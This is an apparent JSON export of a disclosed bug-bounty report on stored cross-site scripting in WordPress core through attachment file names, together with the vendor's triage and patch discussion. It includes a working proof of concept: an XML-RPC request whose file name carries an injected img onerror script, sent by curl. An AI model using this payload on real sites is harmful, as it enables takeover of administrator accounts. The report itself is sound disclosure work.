{"id":139245,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzkyNDU=","url":"https://hackerone.com/reports/139245","title":"WordPress core stored XSS via attachment file name","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-05-17T05:47:51.134Z","submitted_at":"2016-05-17T05:47:51.134Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jouko","url":"/jouko","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":111,"url":"https://hackerone.com/automattic","handle":"automattic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Automattic","twitter_handle":"","website":"https://automattic.com","about":"WordPress.com, VaultPress, Akismet, Gravatar, WooCommerce, Polldaddy, Tumblr and more!"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-08-05T22:07:08.621Z","bug_reporter_agreed_on_going_public_at":"2016-07-06T22:07:01.031Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I think there's a problem with missing HTML encoding of attachment file names. A user with the capability to create attachments could compromise other accounts including administrator by injecting HTML tags in the file name.\n\nCreating attachment with arbitrary filenames is possible at least via the XMLRPC wp.newPost() function.\n\nWith a quick search I found two places where the filename is not HTML-escaped. First, `wp-admin/includes/class-wp-media-list-table.php`:\n~~~~ php\n                \u003cp class=\"filename\"\u003e\n                        \u003cspan class=\"screen-reader-text\"\u003e\u003c?php _e( 'File name:' ); ?\u003e \u003c/span\u003e\n                        \u003c?php\n                        $file = get_attached_file( $post-\u003eID );\n                        echo wp_basename( $file );\n                        ?\u003e\n                \u003c/p\u003e\n~~~~\nThe injected script is triggered when a user clicks the *Media* menu in the Dashboard.\n\nThe second is the attachment page found e.g. with the *attachment_id=xxx* query parameter. It might be theme-dependent. I checked Twenty Fourteen and Twenty Sixteen and both were vulnerable.\n\n#PoC#\n1. Create a file called `xss.xml`:\n~~~~ xml\n\u003c?xml version=\"1.0\"?\u003e\n\u003cmethodCall\u003e\n\u003cmethodName\u003ewp.newPost\u003c/methodName\u003e\n\u003cparams\u003e\n        \u003cparam\u003e\u003cvalue\u003eempty\u003c/value\u003e\u003c/param\u003e\n        \u003cparam\u003e\u003cvalue\u003eusername\u003c/value\u003e\u003c/param\u003e\n        \u003cparam\u003e\u003cvalue\u003epassword\u003c/value\u003e\u003c/param\u003e\n        \u003cparam\u003e\u003cstruct\u003e\n                \u003cmember\u003e\u003cname\u003epost_title\u003c/name\u003e\u003cvalue\u003eaaa\u003c/value\u003e\u003c/member\u003e\n                \u003cmember\u003e\u003cname\u003epost_type\u003c/name\u003e\u003cvalue\u003eattachment\u003c/value\u003e\u003c/member\u003e\n                \u003cmember\u003e\u003cname\u003epost_content\u003c/name\u003e\u003cvalue\u003ebbb\u003c/value\u003e\u003c/member\u003e\n                \u003cmember\u003e\u003cname\u003epost_status\u003c/name\u003e\u003cvalue\u003epublish\u003c/value\u003e\u003c/member\u003e\n                \u003cmember\u003e\u003cname\u003efile\u003c/name\u003e\u003cvalue\u003eccc'\u0026gt;test\u0026lt;img src=x onerror=alert('xss') onload=alert('xss')\u0026gt;\u003c/value\u003e\u003c/member\u003e\n        \u003c/struct\u003e\u003c/param\u003e       \n\u003c/params\u003e\n\u003c/methodCall\u003e\n~~~~\n\n2. Send the request with\n\n~~~~ sh\ncurl 'https://wordpress.site/xmlrpc.php' --data-binary \"`cat xss.xml`\" -H 'Content-type: application/xml'\n~~~~\n\n3. Go to the Dashboard as an administrator and view the media list. An alert box should appear. Only the *list* mode seems to be vulnerable but apparently it's the default.\n","vulnerability_information_html":"\u003cp\u003eI think there\u0026#39;s a problem with missing HTML encoding of attachment file names. A user with the capability to create attachments could compromise other accounts including administrator by injecting HTML tags in the file name.\u003c/p\u003e\n\n\u003cp\u003eCreating attachment with arbitrary filenames is possible at least via the XMLRPC wp.newPost() function.\u003c/p\u003e\n\n\u003cp\u003eWith a quick search I found two places where the filename is not HTML-escaped. First, \u003ccode\u003ewp-admin/includes/class-wp-media-list-table.php\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e                \u003cspan class=\"nt\"\u003e\u0026lt;p\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;filename\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;span\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;screen-reader-text\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e \u003cspan class=\"nx\"\u003e_e\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;File name:\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e \u003cspan class=\"nt\"\u003e\u0026lt;/span\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n                        \u003cspan class=\"nv\"\u003e$file\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eget_attached_file\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nv\"\u003e$post\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"na\"\u003eID\u003c/span\u003e \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                        \u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"nx\"\u003ewp_basename\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nv\"\u003e$file\u003c/span\u003e \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                        \u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;/p\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe injected script is triggered when a user clicks the \u003cem\u003eMedia\u003c/em\u003e menu in the Dashboard.\u003c/p\u003e\n\n\u003cp\u003eThe second is the attachment page found e.g. with the \u003cem\u003eattachment_id=xxx\u003c/em\u003e query parameter. It might be theme-dependent. I checked Twenty Fourteen and Twenty Sixteen and both were vulnerable.\u003c/p\u003e\n\n\u003ch1 id=\"poc\"\u003ePoC\u003c/h1\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eCreate a file called \u003ccode\u003exss.xml\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;methodCall\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;methodName\u0026gt;\u003c/span\u003ewp.newPost\u003cspan class=\"nt\"\u003e\u0026lt;/methodName\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;params\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003eempty\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003eusername\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003epassword\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u0026lt;struct\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003epost_title\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003eaaa\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003epost_type\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003eattachment\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003epost_content\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003ebbb\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003epost_status\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003epublish\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003efile\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003eccc\u0026#39;\u003cspan class=\"ni\"\u003e\u0026amp;gt;\u003c/span\u003etest\u003cspan class=\"ni\"\u003e\u0026amp;lt;\u003c/span\u003eimg src=x onerror=alert(\u0026#39;xss\u0026#39;) onload=alert(\u0026#39;xss\u0026#39;)\u003cspan class=\"ni\"\u003e\u0026amp;gt;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/struct\u0026gt;\u0026lt;/param\u0026gt;\u003c/span\u003e       \n\u003cspan class=\"nt\"\u003e\u0026lt;/params\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/methodCall\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eSend the request with\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ecurl \u003cspan class=\"s1\"\u003e\u0026#39;https://wordpress.site/xmlrpc.php\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e--data-binary\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"nb\"\u003ecat \u003c/span\u003exss.xml\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Content-type: application/xml\u0026#39;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003col\u003e\n\u003cli\u003eGo to the Dashboard as an administrator and view the media list. An alert box should appear. Only the \u003cem\u003elist\u003c/em\u003e mode seems to be vulnerable but apparently it\u0026#39;s the default.\u003c/li\u003e\n\u003c/ol\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-08-05T22:07:01.144Z","allow_singular_disclosure_after":-138781235.2410971,"singular_disclosure_allowed":true,"vote_count":25,"voters":["hunter","shailesh4594","skansing","techintheprovince","xsam","supernatural","muhammad_uwais","jaypatel","t-4-y-m","jens","and 15 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":960621,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I checked wordpress.com and it works there too in the media list.\n","markdown_message":"\u003cp\u003eI checked wordpress.com and it works there too in the media list.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-17T06:06:06.683Z","updated_at":"2016-05-17T06:06:06.683Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":960802,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the report, the WordPress Security Team has been notified of this issue.","markdown_message":"\u003cp\u003eThanks for the report, the WordPress Security Team has been notified of this issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-17T08:58:55.369Z","updated_at":"2016-05-17T08:58:55.369Z","actor":{"username":"vortfu","cleared":false,"url":"/vortfu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":961477,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"screenshot attached, upload didn't work earlier.","markdown_message":"\u003cp\u003escreenshot attached, upload didn\u0026#39;t work earlier.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-17T15:26:49.258Z","updated_at":"2016-05-17T15:26:49.258Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":94325,"filename":"wordpresscom.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/094/325/bb11b93e247431e0f5fa10a48ab24fe48ca80732/wordpresscom.png?response-content-disposition=attachment%3B%20filename%3D%22wordpresscom.png%22%3B%20filename%2A%3DUTF-8%27%27wordpresscom.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ65C6B2IJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042736Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDUDlftdKCwahQOnPUKizOkg2EzWpa90Y7MV2cJRjoCFAiEA7Y2OQGIwYjcI2ewX5wzy7TrFHvDUf%2BCIL8e2DBoQ8fsqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDKstxWWwDBb9kBJ3SSqRAyYWn3xpHc0USlh6j0wUSD0P5lO2wLxrjvfOA2dyjKZVBt1gxJU12nqIqX3KIg9FMETGEwUxbJSTMSoAcGPp86A4SMVO8Ppo%2FbSGSoejkYE57Bm25m03qu80tv22vPGnS25uBEQwCGHzeB2vvgj1L%2F15%2FdzT0%2BG4%2F74LUGHuubNg%2B1XOneA7L7zqEmAAr70tzAVWPrguJqems75lbK%2BgcQwymG9sVI%2Fc6Td6ZStY2vC4MGQhtj%2FB2Gxx7UAazrOqjIGb1G9qSrFARMAiCA7vgzOMlozejJvfAqou2z6NM3lDtH8wHmf%2B04QN5xiDr1wHZOWKVAIeC5Ng5ZOHrGZHtIwdpNYeb2lpY41KE2SAlCRzfQencarj%2BFbPOGd%2BdHnCDIJlkJ1M1OhMbkMpBhgRTzJvpjEERD9SlENQz5LcU8UE9skEafYGlX74JBQCbHp8ggo6mahYoFYYmhlSHgdatm%2B%2B80xz%2FD0LdF7MbyN1WO9WSpnnpVn2rGssLX2aL6wHE4ounfUDQ%2B4P4CmCmYXO1gdWMISXqv8FOusBPH9k2FVakiaEQK4YvWltErNybc3TWS8xjxBe6uFjakG136A%2F7cfMlNRnx071vXJ5t%2FnQ0DZo2Y862T0BMLrHkL3Pal5DQwlhftJzzG0wIFtIf3KfvhKUoOTyenebyJM9PSNwU%2Faz7Lk6mjCUBlIcBPoaXxLvWVV5GfzpPmZeYyz44K91%2B%2BJNPxEcwRShDiit42CCyNfZyC8VIfo21uwKB4nV6gkhX8R%2Blh0KSG1wieFtWcFGCxcDONA9mTKdk1sq7POkUsFpKtFYS%2BgWPlrqp9a%2FEOoUGn3Q91oQVzp5eFzuVvos0aQZvs39%2Bw%3D%3D\u0026X-Amz-Signature=007d0417222bbdf2b632f407ddeeb6f23940fbab67236e43bc121025b8e432fa"}],"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":981511,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Jouko,\n\nThank you again for the report, we reproduced it and we have a patch that I can send to test, if you’d like. We’re still looking at some details on the approach – thinking of ways to make it safer for plugins  (or forgotten pieces in core) that aren’t escaping the value.\n\nAs for release, we have a point release planned in few weeks that will also include few other security fixes. How does it sound to include the fix for this one there?\n\nLast, but not least, have something changed in the way you’d like to be credited? Before it was Jouko Pynnönen, linking to http://klikki.fi/.","markdown_message":"\u003cp\u003eHello Jouko,\u003c/p\u003e\n\n\u003cp\u003eThank you again for the report, we reproduced it and we have a patch that I can send to test, if you’d like. We’re still looking at some details on the approach – thinking of ways to make it safer for plugins  (or forgotten pieces in core) that aren’t escaping the value.\u003c/p\u003e\n\n\u003cp\u003eAs for release, we have a point release planned in few weeks that will also include few other security fixes. How does it sound to include the fix for this one there?\u003c/p\u003e\n\n\u003cp\u003eLast, but not least, have something changed in the way you’d like to be credited? Before it was Jouko Pynnönen, linking to \u003ca title=\"http://klikki.fi/\" href=\"/redirect?url=http%3A%2F%2Fklikki.fi%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://klikki.fi/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-24T16:03:25.785Z","updated_at":"2016-05-24T16:03:25.785Z","actor":{"username":"nikolayb","cleared":false,"url":"/nikolayb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/838/e07dd5308575ffd0d3b0f0650974a8482379734e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":982655,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok. I can check out the patch, put it here or jouko@iki.fi. Can you also change the credits link to https://klikki.fi ","markdown_message":"\u003cp\u003eOk. I can check out the patch, put it here or \u003ca title=\"jouko@iki.fi\" href=\"mailto:jouko@iki.fi\" rel=\"nofollow noopener noreferrer\"\u003ejouko@iki.fi\u003c/a\u003e. Can you also change the credits link to \u003ca title=\"https://klikki.fi\" href=\"/redirect?url=https%3A%2F%2Fklikki.fi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://klikki.fi\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-25T05:45:59.826Z","updated_at":"2016-05-25T05:45:59.826Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":984894,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-26T12:44:30.905Z","updated_at":"2016-05-26T12:44:30.905Z","actor":{"username":"vortfu","cleared":false,"url":"/vortfu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":985794,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is the current patch that escapes the values, I would appreciate if you try to break it :)\n\nWe’re looking for a better backwards-compatible and portable across filesystems way to restrict what filenames we accept.","markdown_message":"\u003cp\u003eHere is the current patch that escapes the values, I would appreciate if you try to break it :)\u003c/p\u003e\n\n\u003cp\u003eWe’re looking for a better backwards-compatible and portable across filesystems way to restrict what filenames we accept.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-26T19:56:35.826Z","updated_at":"2016-05-26T19:56:35.826Z","actor":{"username":"nikolayb","cleared":false,"url":"/nikolayb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/838/e07dd5308575ffd0d3b0f0650974a8482379734e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":96286,"filename":"139245.0.diff","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/096/286/38b020d766c85ca2a95a9167ef1fa89ff6aff72c/139245.0.diff?response-content-disposition=attachment%3B%20filename%3D%22139245.0.diff%22%3B%20filename%2A%3DUTF-8%27%27139245.0.diff\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ65C6B2IJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042736Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDUDlftdKCwahQOnPUKizOkg2EzWpa90Y7MV2cJRjoCFAiEA7Y2OQGIwYjcI2ewX5wzy7TrFHvDUf%2BCIL8e2DBoQ8fsqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDKstxWWwDBb9kBJ3SSqRAyYWn3xpHc0USlh6j0wUSD0P5lO2wLxrjvfOA2dyjKZVBt1gxJU12nqIqX3KIg9FMETGEwUxbJSTMSoAcGPp86A4SMVO8Ppo%2FbSGSoejkYE57Bm25m03qu80tv22vPGnS25uBEQwCGHzeB2vvgj1L%2F15%2FdzT0%2BG4%2F74LUGHuubNg%2B1XOneA7L7zqEmAAr70tzAVWPrguJqems75lbK%2BgcQwymG9sVI%2Fc6Td6ZStY2vC4MGQhtj%2FB2Gxx7UAazrOqjIGb1G9qSrFARMAiCA7vgzOMlozejJvfAqou2z6NM3lDtH8wHmf%2B04QN5xiDr1wHZOWKVAIeC5Ng5ZOHrGZHtIwdpNYeb2lpY41KE2SAlCRzfQencarj%2BFbPOGd%2BdHnCDIJlkJ1M1OhMbkMpBhgRTzJvpjEERD9SlENQz5LcU8UE9skEafYGlX74JBQCbHp8ggo6mahYoFYYmhlSHgdatm%2B%2B80xz%2FD0LdF7MbyN1WO9WSpnnpVn2rGssLX2aL6wHE4ounfUDQ%2B4P4CmCmYXO1gdWMISXqv8FOusBPH9k2FVakiaEQK4YvWltErNybc3TWS8xjxBe6uFjakG136A%2F7cfMlNRnx071vXJ5t%2FnQ0DZo2Y862T0BMLrHkL3Pal5DQwlhftJzzG0wIFtIf3KfvhKUoOTyenebyJM9PSNwU%2Faz7Lk6mjCUBlIcBPoaXxLvWVV5GfzpPmZeYyz44K91%2B%2BJNPxEcwRShDiit42CCyNfZyC8VIfo21uwKB4nV6gkhX8R%2Blh0KSG1wieFtWcFGCxcDONA9mTKdk1sq7POkUsFpKtFYS%2BgWPlrqp9a%2FEOoUGn3Q91oQVzp5eFzuVvos0aQZvs39%2Bw%3D%3D\u0026X-Amz-Signature=5267abd9c03e0025f13127730482839c14108a7bc1d6208b4ba2243a36c8113e"}],"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1003462,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey again, Jouko, did you have a chance to test out the patch and confirm whether it fixes the issue?","markdown_message":"\u003cp\u003eHey again, Jouko, did you have a chance to test out the patch and confirm whether it fixes the issue?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-07T19:08:16.125Z","updated_at":"2016-06-07T19:08:16.125Z","actor":{"username":"nikolayb","cleared":false,"url":"/nikolayb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/838/e07dd5308575ffd0d3b0f0650974a8482379734e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1004604,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, seems quite straightforward and fixes the issue as far as I can see.","markdown_message":"\u003cp\u003eYes, seems quite straightforward and fixes the issue as far as I can see.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-08T13:48:02.351Z","updated_at":"2016-06-08T13:48:02.351Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1029989,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey, Jouko, the fix was released: https://wordpress.org/news/2016/06/wordpress-4-5-3/\n\nThanks again for the responsible disclosure, the bounty will follow shortly.","markdown_message":"\u003cp\u003eHey, Jouko, the fix was released: \u003ca title=\"https://wordpress.org/news/2016/06/wordpress-4-5-3/\" href=\"/redirect?url=https%3A%2F%2Fwordpress.org%2Fnews%2F2016%2F06%2Fwordpress-4-5-3%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://wordpress.org/news/2016/06/wordpress-4-5-3/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThanks again for the responsible disclosure, the bounty will follow 